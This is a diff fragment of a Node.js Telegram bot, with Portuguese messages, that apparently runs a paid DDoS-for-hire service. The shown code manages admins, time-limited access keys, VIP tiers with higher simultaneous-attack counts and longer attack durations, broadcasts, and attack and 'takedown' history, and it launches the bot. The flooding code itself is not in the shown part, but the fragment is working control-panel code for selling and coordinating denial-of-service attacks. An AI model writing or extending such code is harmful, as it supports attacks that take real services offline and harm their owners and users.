+            admCount++;
+            continue;
+        }
+        
+        if (user.vip || vipUsers.has(id)) {
+            vipCount++;
+            continue;
+        }
+        
+        user.simultaneousLimit = 1;
+        user.maxTime = 30;
+        user.limit = 1;
+        user.patente = 'PADRAO';
+        user.plano = 'GRATUITO';
+        count++;
+    }
+    
+    saveUsers();
+    
+    await ctx.replyWithHTML(
+        '🗑️ <b>PADRÃO REMOVIDO!</b>\n\n' +
+        `🔄 1x | ⏱️ 30s\n\n` +
+        `👤 ${count} usuários restaurados\n` +
+        `⭐ ${vipCount} VIPs\n` +
+        `👑 ${admCount} ADMs\n\n` +
+        `📌 Apenas VIPs têm benefícios.`
+    );
+    
+    await sendLogToAdmin(
+        `🗑️ PADRÃO REMOVIDO\n` +
+        `👤 ${count} usuários restaurados`
+    );
+});
+
+
+bot.command('node', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    let msg = ctx.message.text.replace('/node', '').trim();
+    if (!msg) {
+        return ctx.reply('📢 /node [MSG]\nEx: /node Manutenção às 22h');
+    }
+    
+
+    const repliedMsg = ctx.message.reply_to_message;
+    let targetUserId = null;
+    
+    if (repliedMsg && repliedMsg.from) {
+        targetUserId = repliedMsg.from.id.toString();
+        msg = repliedMsg.text || 'Mensagem sem texto';
+    }
+    
+    let sent = 0;
+    let errors = 0;
+    
+    if (targetUserId) {
+        
+        try {
+            await bot.telegram.sendMessage(
+                targetUserId,
+                `📩 <b>MENSAGEM DO ADM</b>\n\n${msg}`,
+                { parse_mode: 'HTML' }
+            );
+            sent = 1;
+        } catch(e) {
+            errors = 1;
+        }
+        
+        await ctx.replyWithHTML(
+            `📩 <b>MENSAGEM ENVIADA</b>\n\n` +
+            `👤 Usuário: ${targetUserId}\n` +
+            `✅ ${sent > 0 ? 'Enviado com sucesso!' : '❌ Erro ao enviar'}`
+        );
+    } else {
+        // Envia para todos os usuários
+        for (const [id, user] of authorizedUsers) {
+            try {
+                await bot.telegram.sendMessage(
+                    id,
+                    `📢 <b>AVISO DO ADMIN</b>\n\n${msg}`,
+                    { parse_mode: 'HTML' }
+                );
+                sent++;
+                await new Promise(r => setTimeout(r, 50));
+            } catch(e) {
+                errors++;
+            }
+        }
+        
+        await ctx.replyWithHTML(
+            `📢 <b>AVISO ENVIADO!</b>\n\n` +
+            `✅ ${sent} usuários\n` +
+            `❌ ${errors} erros`
+        );
+    }
+});
+
+
+bot.command('adm', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isDono(userId)) {
+        return ctx.reply('🚫 APENAS O DONO');
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('/adm [ID]\nEx: /adm 123456789');
+    }
+    
+    const targetId = args[1].trim();
+    if (!/^\d+$/.test(targetId)) return ctx.reply('❌ ID INVALIDO');
+    
+    if (isAdmin(targetId)) {
+        return ctx.reply('❌ JÁ É ADMIN');
+    }
+    
+    adminList.add(targetId);
+    saveAdmins();
+    
+    if (!authorizedUsers.has(targetId)) {
+        authorizedUsers.set(targetId, {
+            limit: 999, currentAttacks: 0, maxTime: GLOBAL_MAX_TIME,
+            maxRps: GLOBAL_MAX_RPS, maxThreads: GLOBAL_MAX_THREADS, simultaneousLimit: 999,
+            patente: 'ADMIN', plano: 'VITALICIO', vip: true,
+            total_attacks: 0, total_quedas: 0,
+            first_name: '', username: '',
+            added_by: DONO_ID, added_at: Date.now()
+        });
+    } else {
+        const user = authorizedUsers.get(targetId);
+        user.vip = true;
+        user.patente = 'ADMIN';
+        user.plano = 'VITALICIO';
+        user.simultaneousLimit = 999;
+        user.maxTime = GLOBAL_MAX_TIME;
+        user.limit = 999;
+    }
+    saveUsers();
+    
+    await ctx.reply('✅ ADMIN ADICIONADO: ' + targetId);
+    
+    try {
+        await bot.telegram.sendMessage(targetId,
+            '🎉 VOCÊ FOI PROMOVIDO A ADMIN!\n\n' +
+            'Use /start para ver os comandos.'
+        );
+    } catch(e) {}
+    
+    await sendLogToAdmin('👑 NOVO ADMIN: ' + targetId);
+});
+
+
+bot.command('removeadm', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isDono(userId)) {
+        return ctx.reply('🚫 APENAS O DONO');
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('/removeadm [ID]');
+    }
+    
+    const targetId = args[1].trim();
+    if (isDono(targetId)) return ctx.reply('❌ NÃO PODE REMOVER O DONO');
+    if (!adminList.has(targetId)) return ctx.reply('❌ NÃO É ADMIN');
+    
+    adminList.delete(targetId);
+    saveAdmins();
+    
+    const user = authorizedUsers.get(targetId);
+    if (user) {
+        user.patente = 'PADRAO';
+        user.plano = 'GRATUITO';
+        user.vip = false;
+        user.simultaneousLimit = 1;
+        user.maxTime = 30;
+        user.limit = 1;
+        saveUsers();
+    }
+    
+    await ctx.reply('✅ ADMIN REMOVIDO: ' + targetId);
+});
+
+
+bot.command('listadmins', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    let msg = '👑 ADMINISTRADORES\n\n';
+    msg += '👑 DONO: ' + DONO_ID + '\n';
+    msg += '━━━━━━━━━━━━━━━━━━━━\n';
+    
+    let count = 0;
+    for (const adminId of adminList) {
+        if (adminId === DONO_ID) continue;
+        count++;
+        const user = authorizedUsers.get(adminId);
+        const name = user?.first_name || 'Desconhecido';
+        msg += count + '. ' + adminId + ' - ' + name + '\n';
+    }
+    
+    if (count === 0) msg += 'Nenhum admin adicional.\n';
+    msg += '\n📊 Total: 1 DONO + ' + count + ' ADMINS';
+    
+    await ctx.reply(msg);
+});
+
+
+bot.command('gerakey', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 4) {
+        return ctx.reply(
+            '🔑 /gerakey [SIM] [TEMPO] [DUR]\n' +
+            'Ex: /gerakey 1 120 1d\n' +
+            'Formatos: d, h, m'
+        );
+    }
+    
+    const sim = parseInt(args[1]);
+    const maxTime = parseInt(args[2]);
+    const duracaoStr = args[3].toLowerCase();
+    
+    if (isNaN(sim) || sim < 1) return ctx.reply('❌ SIM INVALIDO');
+    if (isNaN(maxTime) || maxTime < 10) return ctx.reply('❌ TEMPO INVALIDO');
+    
+    let durationSeconds = 0;
+    let durationText = '';
+    
+    if (duracaoStr.endsWith('d')) {
+        const val = parseInt(duracaoStr);
+        if (isNaN(val) || val < 1) return ctx.reply('❌ DIAS INVALIDOS');
+        durationSeconds = val * 86400;
+        durationText = val + ' dia(s)';
+    } else if (duracaoStr.endsWith('h')) {
+        const val = parseInt(duracaoStr);
+        if (isNaN(val) || val < 1) return ctx.reply('❌ HORAS INVALIDAS');
+        durationSeconds = val * 3600;
+        durationText = val + ' hora(s)';
+    } else if (duracaoStr.endsWith('m')) {
+        const val = parseInt(duracaoStr);
+        if (isNaN(val) || val < 1) return ctx.reply('❌ MINUTOS INVALIDOS');
+        durationSeconds = val * 60;
+        durationText = val + ' minuto(s)';
+    } else {
+        return ctx.reply('❌ FORMATO INVALIDO! Use: 1d, 1h ou 1m');
+    }
+    
+    if (durationSeconds < 60) return ctx.reply('❌ DURAÇÃO MÍNIMA: 1 MINUTO');
+    
+    const key = 'c3-' + Date.now().toString(36) + '-' + Math.random().toString(36).substring(2, 8);
+    const expiresAt = Math.floor(Date.now() / 1000) + durationSeconds;
+    
+    apiKeys.set(key, {
+        user_id: userId,
+        created_at: Math.floor(Date.now() / 1000),
+        expires_at: expiresAt,
+        duration: durationSeconds,
+        simultaneous: sim,
+        max_time: maxTime,
+        active: true,
+        created_by_name: ctx.from.first_name || 'ADMIN',
+        created_by_id: userId
+    });
+    
+    saveApiKeys();
+    
+    await ctx.reply(
+        '✅ KEY GERADA\n\n' +
+        '🔑 ' + key + '\n' +
+        '🔄 ' + sim + 'x | ⏱️ ' + maxTime + 's\n' +
+        '⏳ ' + durationText
+    );
+});
+
+
+bot.command('listkeys', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    if (apiKeys.size === 0) {
+        return ctx.reply('📋 NENHUMA KEY CADASTRADA');
+    }
+    
+    let msg = '🔑 API KEYS\n\n';
+    let count = 0;
+    const now = Math.floor(Date.now() / 1000);
+    
+    for (const [key, data] of apiKeys) {
+        count++;
+        const remaining = Math.max(0, (data.expires_at || 0) - now);
+        const status = data.active && remaining > 0 ? '✅ ATIVA' : '❌ EXPIRADA';
+        
+        msg += '#' + count + ': ' + key + '\n';
+        msg += '   Status: ' + status + '\n';
+        msg += '   Simul: ' + (data.simultaneous || 'N/A') + '\n';
+        msg += '   Tempo: ' + (data.max_time || 'N/A') + 's\n\n';
+        
+        if (msg.length > 3500) {
+            await ctx.reply(msg);
+            msg = '';
+        }
+    }
+    
+    if (msg) {
+        msg += '━━━━━━━━━━━━━━━━━━━━\n';
+        msg += 'Total: ' + apiKeys.size + ' keys';
+        await ctx.reply(msg);
+    }
+});
+
+
+bot.command('revoke', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('/revoke [KEY]');
+    }
+    
+    const key = args[1];
+    
+    if (apiKeys.has(key)) {
+        const keyData = apiKeys.get(key);
+        keyData.active = false;
+        keyData.revoked_at = Math.floor(Date.now() / 1000);
+        keyData.revoked_by = userId;
+        saveApiKeys();
+        
+        await ctx.reply('✅ KEY REVOGADA: ' + key);
+        await sendLogToAdmin('🗑️ KEY REVOGADA: ' + key);
+    } else {
+        await ctx.reply('❌ KEY NÃO ENCONTRADA');
+    }
+});
+
+
+bot.command('addvip', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 5) {
+        return ctx.reply(
+            '👑 /addvip [ID] [SIM] [TEMPO] [DUR]\n' +
+            'Ex: /addvip 123456789 5 300 1d'
+        );
+    }
+    
+    const targetId = args[1];
+    const sim = parseInt(args[2]);
+    const tmax = parseInt(args[3]);
+    const duracaoStr = args[4].toLowerCase();
+    
+    if (isNaN(sim) || sim < 1) return ctx.reply('❌ SIM INVALIDO');
+    if (isNaN(tmax) || tmax < 10) return ctx.reply('❌ TEMPO INVALIDO');
+    
+    let durationSeconds = 0;
+    let durationText = '';
+    
+    if (duracaoStr.endsWith('d')) {
+        const val = parseInt(duracaoStr);
+        if (isNaN(val) || val < 1) return ctx.reply('❌ DIAS INVALIDOS');
+        durationSeconds = val * 86400;
+        durationText = val + ' dia(s)';
+    } else if (duracaoStr.endsWith('h')) {
+        const val = parseInt(duracaoStr);
+        if (isNaN(val) || val < 1) return ctx.reply('❌ HORAS INVALIDAS');
+        durationSeconds = val * 3600;
+        durationText = val + ' hora(s)';
+    } else if (duracaoStr.endsWith('m')) {
+        const val = parseInt(duracaoStr);
+        if (isNaN(val) || val < 1) return ctx.reply('❌ MINUTOS INVALIDOS');
+        durationSeconds = val * 60;
+        durationText = val + ' minuto(s)';
+    } else {
+        return ctx.reply('❌ FORMATO INVALIDO! Use: 1d, 1h ou 1m');
+    }
+    
+    const existingUser = authorizedUsers.get(targetId);
+    
+    vipUsers.set(targetId, {
+        simultaneous: sim,
+        maxTime: tmax,
+        expires_at: Date.now() + (durationSeconds * 1000),
+        added_by: userId,
+        added_at: Date.now()
+    });
+    saveVips();
+    
+    if (!authorizedUsers.has(targetId)) {
+        authorizedUsers.set(targetId, {
+            limit: sim,
+            currentAttacks: 0,
+            maxTime: tmax,
+            maxRps: GLOBAL_MAX_RPS,
+            maxThreads: GLOBAL_MAX_THREADS,
+            simultaneousLimit: sim,
+            patente: 'ELITE',
+            plano: 'MENSAL',
+            vip: true,
+            total_attacks: 0,
+            total_quedas: 0,
+            first_name: '',
+            username: '',
+            added_by: userId,
+            added_at: Date.now()
+        });
+    } else {
+        const user = authorizedUsers.get(targetId);
+        user.vip = true;
+        user.patente = 'ELITE';
+        user.plano = 'MENSAL';
+        user.simultaneousLimit = sim;
+        user.maxTime = tmax;
+        user.limit = sim;
+    }
+    saveUsers();
+    
+    await ctx.reply('✅ VIP ADICIONADO: ' + targetId + '\n🔄 ' + sim + 'x | ⏱️ ' + tmax + 's\n⏳ ' + durationText);
+    
+    try {
+        await bot.telegram.sendMessage(targetId,
+            '🎉 VOCÊ FOI PROMOVIDO A VIP!\n\n' +
+            '🔄 ' + sim + 'x | ⏱️ ' + tmax + 's\n' +
+            '⏳ ' + durationText + '\n\n' +
+            'Use /attack para começar!'
+        );
+    } catch(e) {}
+});
+
+
+bot.command('removevip', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('/removevip [ID]');
+    }
+    
+    const targetId = args[1];
+    
+    if (vipUsers.has(targetId)) {
+        vipUsers.delete(targetId);
+        saveVips();
+    }
+    
+    const user = authorizedUsers.get(targetId);
+    if (user) {
+        user.vip = false;
+        user.patente = 'PADRAO';
+        user.plano = 'GRATUITO';
+        user.simultaneousLimit = 1;
+        user.maxTime = 30;
+        user.limit = 1;
+        saveUsers();
+    }
+    
+    await ctx.reply('✅ VIP REMOVIDO: ' + targetId);
+});
+
+
+bot.command('listvip', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    if (vipUsers.size === 0) {
+        return ctx.reply('📋 NENHUM VIP CADASTRADO');
+    }
+    
+    let msg = '👑 LISTA VIP\n\n';
+    let count = 0;
+    
+    for (const [id, data] of vipUsers) {
+        count++;
+        const remaining = getVipRemaining(id);
+        const user = authorizedUsers.get(id);
+        const name = user?.first_name || 'N/A';
+        
+        msg += '#' + count + ': ' + id + '\n';
+        msg += '   📛 ' + name + '\n';
+        msg += '   🔄 ' + (data.simultaneous || 'N/A') + 'x\n';
+        msg += '   ⏱️ ' + (data.maxTime || 'N/A') + 's\n';
+        msg += '   ⏳ ' + formatVipRemaining(remaining) + '\n\n';
+    }
+    
+    msg += '━━━━━━━━━━━━━━━━━━━━\n';
+    msg += 'Total: ' + vipUsers.size + ' VIPs';
+    
+    await ctx.reply(msg);
+});
+
+
+bot.command('clearhistory', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    
+    if (!isAdmin(userId)) {
+        return ctx.reply('🚫 ACESSO BLOQUEADO');
+    }
+    
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('/clearhistory [ID/all]');
+    }
+    
+    const target = args[1];
+    
+    if (target === 'all') {
+        userAttackHistory.clear();
+        saveAttackHistory();
+        authorizedUsers.forEach(user => { user.total_attacks = 0; user.total_quedas = 0; });
+        saveUsers();
+        await ctx.reply('✅ TODO HISTORICO LIMPO');
+    } else {
+        if (userAttackHistory.has(target)) {
+            userAttackHistory.delete(target);
+            saveAttackHistory();
+            const user = authorizedUsers.get(target);
+            if (user) { user.total_attacks = 0; user.total_quedas = 0; saveUsers(); }
+            await ctx.reply('✅ HISTORICO DE ' + target + ' LIMPO');
+        } else {
+            await ctx.reply('❌ USUARIO NAO ENCONTRADO');
+        }
+    }
+});
+
+
+bot.launch().then(() => {
+    console.log('═══════════════════════════════════════════');
+    console.log('☢️ C3-CORE V10.3 - NUCLEO777');
+    console.log('🔒 PROTECAO MAXIMA ATIVADA');
+    console.log('═══════════════════════════════════════════');
+    console.log('👑 DONO: ' + DONO_ID);
+    console.log('👥 ADMINS: ' + adminList.size);
+    console.log('⚡ RPS: ' + FIXED_RPS + ' | THREADS: ' + FIXED_THREADS);
+    console.log('📦 OJIVAS: ' + Object.keys(OJIVAS).length);
+    console.log('🔑 API KEYS: ' + apiKeys.size);
+    console.log('🔒 ALVOS BLOQUEADOS: ' + blockedTargets.size);
+    console.log('═══════════════════════════════════════════');
+});
+
+adminBot.launch().catch(e => console.log('[ADMIN BOT] Erro:', e.message));
+
+
+process.on('SIGINT', () => {
+    console.log('\n🛑 FINALIZANDO...');
+    saveApiKeys();
+    saveUsers();
+    saveBlocked();
+    saveStats();
+    saveAttackHistory();
+    saveAdmins();
+    saveVips();
+    saveDefaultConfig();
+    for (const [id, attack] of activeAttacks) {
+        if (attack.timerTimeout) clearTimeout(attack.timerTimeout);
+        if (attack.statusInterval) clearInterval(attack.statusInterval);
+        if (attack.processes) {
+            attack.processes.forEach(p => { try { killProcessTree(p.pid); } catch(e) {} });
+        }
+    }
+    process.exit(0);
+});
